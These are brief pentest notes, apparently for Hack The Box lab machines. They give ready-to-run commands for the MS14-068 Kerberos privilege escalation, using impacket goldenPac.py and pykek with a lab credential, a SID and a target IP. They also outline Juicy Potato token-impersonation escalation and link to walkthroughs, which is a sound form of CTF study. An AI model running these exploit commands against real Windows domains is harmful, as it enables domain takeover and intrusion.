## Notes

MS14-068
------
add htb.local and mantis.htb.local to /etc/hosts

impacket goldenpac <= 9.18 works, 9.19 does not work on mantis, or use pykek ms14-068<br/> 
```
goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local

python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
rpcclient -U james 10.10.10.52
```


htb mantis:
[LINK-1](https://medium.com/secjuice/hackthebox-mantis-writeup-9c2b50c4b30b)
[LINK-2](https://alamot.github.io/mantis_writeup/)


Juicy Potato
------
[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) <br/> `whoami /priv` has `SeImpersonatePrivilege`

need CLSID, pick ones with NT AUTHORITY\SYSTEM : [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

htb conceal:
[LINK-1](https://0xrick.github.io/hack-the-box/conceal/)
[LINK-2](https://hackso.me/conceal-htb-walkthrough/)